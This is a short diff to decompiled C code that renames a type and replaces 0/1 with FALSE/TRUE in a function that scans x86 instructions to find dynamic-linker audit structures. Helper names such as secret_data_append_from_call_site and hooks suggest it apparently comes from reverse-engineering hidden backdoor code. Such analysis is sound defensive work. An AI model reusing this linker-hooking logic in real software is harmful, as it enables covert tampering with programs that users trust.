@@ -45,14 +45,14 @@ BOOL find_link_map_l_audit_any_plt
   instruction_search_ctx_t local_c0;
   u8 *local_80;
   u64 local_78;
-  _union_77 local_70;
+  _union_78 local_70;
   byte local_60;
   int local_58;
   u8 *local_50;
   
   bVar14 = 0;
-  BVar4 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x85,0x12,8,0);
-  if (BVar4 != 0) {
+  BVar4 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x85,0x12,8,FALSE);
+  if (BVar4 != FALSE) {
     plVar1 = imported_funcs->libc;
     ppuVar10 = &local_80;
     for (lVar7 = 0x16; lVar7 != 0; lVar7 = lVar7 + -1) {
@@ -83,7 +83,7 @@ BOOL find_link_map_l_audit_any_plt
     }
     while ((code_start < code_end &&
            (BVar4 = x86_dasm((dasm_ctx_t *)&local_80,(u8 *)code_start,(u8 *)code_end),
-           uVar3 = local_78, BVar4 != 0))) {
+           uVar3 = local_78, BVar4 != FALSE))) {
       if ((local_58 == 0x1036) &&
          ((((ushort)local_70._0_4_ & 0x140) == 0x140 && ((byte)(local_70._13_1_ - 1) < 2)))) {
         uVar13 = 0;
@@ -149,11 +149,11 @@ BOOL find_link_map_l_audit_any_plt
             local_c0.hooks = hooks;
             local_c0.imported_funcs = imported_funcs;
             BVar4 = find_link_map_l_audit_any_plt_bitmask(data,&local_c0);
-            if (BVar4 != 0) {
-              return 1;
+            if (BVar4 != FALSE) {
+              return TRUE;
             }
-            if (local_c0.result != 0) {
-              return 0;
+            if (local_c0.result != FALSE) {
+              return FALSE;
             }
           }
         }
@@ -162,6 +162,6 @@ LAB_00104fd8:
       code_start = code_start + local_78;
     }
   }
-  return 0;
+  return FALSE;
 }
 
